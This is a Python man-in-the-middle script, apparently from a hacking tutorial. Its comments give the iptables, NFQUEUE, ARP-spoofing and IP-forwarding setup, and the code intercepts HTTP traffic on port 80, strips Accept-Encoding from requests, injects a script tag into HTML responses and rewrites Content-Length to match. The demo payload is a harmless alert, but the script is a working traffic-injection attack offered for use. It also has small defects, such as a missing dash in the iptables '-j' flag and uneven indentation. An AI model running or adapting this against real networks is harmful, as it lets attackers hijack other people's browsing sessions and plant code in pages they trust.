# run in terminal: iptables --flush
# run in terminal: iptables -I FORWARD j NFQUEUE --queue-num 0
# run python arp_spoof.py (become MITM)
# run in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward (allows packets to flow through our machine)

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		# request
		if scapy_packet[scapy.TCP].dport == 80:
			print("[+] Request")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
		# response
		elif scapy_packet[scapy.TCP].sport == 80:
			print("[+] Reqsponse")
			injection_code = "<script>alert('test');</script>"
			load = load.replace("</body>", injection_code+"</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()